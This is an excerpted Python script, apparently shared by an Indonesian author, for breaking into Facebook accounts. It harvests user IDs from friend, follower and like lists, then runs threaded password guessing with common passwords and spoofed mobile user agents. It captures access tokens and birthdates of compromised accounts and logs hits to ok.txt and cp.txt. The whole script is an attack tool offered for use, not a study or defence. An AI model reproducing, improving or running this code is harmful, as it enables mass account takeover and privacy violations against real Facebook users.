...
~~> Kalo Mau Izin, Izin lewat instgrm/email/

~~> insgrm : https://www.instagram.com/

~~> email  : @gmail.com

~~> fb     : https://www.facebook.com/Seaik00
...
def cookie():
	...
	try:
		...
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36', # Don't Replace Ea Anjink.
...
def menu():
    ...
    print("\033[1;96m"+50*"-")
    print("\n%s [%s01%s] Crack fb from your own friends list"%(p,b,p))
    print("%s [%s02%s] Crack fb from public friends list "%(p,b,p))
    print("%s [%s03%s] Crack fb from public followers "%(p,b,p))
    print("%s [%s04%s] Crack fb from public likes"%(p,b,p))
    print("%s [%s05%s] Public multi fb crack"%(p,b,p))
    print("%s [%s06%s] Check the cracked session account options"%(p,b,p))
    print("%s [%s07%s] Useragent settings"%(p,b,p))
    print("%s [%s99%s] Check the crack results ok-cp"%(p,b,p))
    print("%s [%s00%s] Log out of this accounti"%(p,b,p))
    pill = raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if pill in ["1","01"]:
        teman()
        dekura_x()
...
def followers():
    ...
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Sorry, the target followers are 0'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))
	...
	if dekurasayangara in [""]:
		...
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: dear, handsome, beautiful\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Don't be empty"%(p,m,p))
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Ok result saved in : ok.txt\n %s[%s•%s] cp results saved in : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Airplane mode 5/10 sec if no result!"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						...
						dekura = [ "muhammad", "bissmilah", "hossain", "iloveu", "freefire", "muammel", "bangladesh", "mahmudul" ]
...
def api(uid, dekura):
	try:
		...
		ua = ("Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	...
	for pw in dekura:
		...
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r \x1b[1;32m %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			...
			try:
				...
				with requests.Session() as ses:
					...
					month = bulan_ttl[month]
					print("\r\x1b[1;33m %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
			...
			print("\r\x1b[1;33m %s|%s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
...
def dekura_chann(user, pasw):
	...
	ua = ("Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
